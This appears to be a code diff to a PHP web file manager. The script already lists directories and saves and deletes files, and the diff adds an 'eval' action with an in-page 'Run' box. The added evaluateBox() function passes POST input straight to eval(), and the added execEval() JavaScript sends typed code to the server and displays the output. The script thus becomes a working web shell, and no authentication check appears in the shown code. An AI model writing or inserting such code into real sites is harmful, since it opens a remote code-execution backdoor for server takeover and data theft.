@@ -139,6 +139,18 @@ function deleteSubject($subject) {
 	die;
 }
 
+function evaluateBox() {
+	if ($_POST['v'] === NULL) {
+		echo '<input id="v" type="textbox"><input id="evalbtn" type="button" value="Run" onclick="execEval()" >
+<div id="command_output"></div>
+';
+	} else {
+		ob_clean();
+		eval(gpc($_POST['v']));
+		die;
+	}
+}
+
 ?>
 <html>
 <head>
@@ -277,6 +289,35 @@ function browseDir(dir) {
 	location.href = "?action=dir&s=" + dir;
 }
 
+function execEval() {
+	var ajax = newXMLHTTP();
+	var evalBox = document.getElementById("v");
+	var params = "v=" + escape(evalBox.value);
+	var evalBtn = document.getElementById("evalbtn");
+	var comOut = document.getElementById("command_output");
+
+	evalBtn.value = "Wait...";
+	evalBtn.disabled = true;
+
+	ajax.onreadystatechange = function() {
+		if (ajax.readyState == 4) {
+			if (ajax.status == 200) {
+				comOut.innerHTML += ajax.responseText;
+			}
+			else {
+				comOut.innerHTML += "<font color=\'red\'>Couldn't execute.</font><br />";
+			}
+		}
+		evalBtn.disabled = false;
+		evalBtn.value = "Run";
+	}
+	ajax.open("POST", "?action=eval", true);
+	ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	ajax.setRequestHeader("Content-length", params.length);
+	ajax.setRequestHeader("Connection", "close");
+	ajax.send(params);
+}
+
 </script>
 </head>
 
@@ -319,6 +360,9 @@ switch ($action) {
 	case 'save':
 		ob_clean();
 		saveFile($subject, $value);
+		break;
+	case 'eval':
+		evaluateBox();
 		break;
 	case 'dir':
 		printDir($subject);
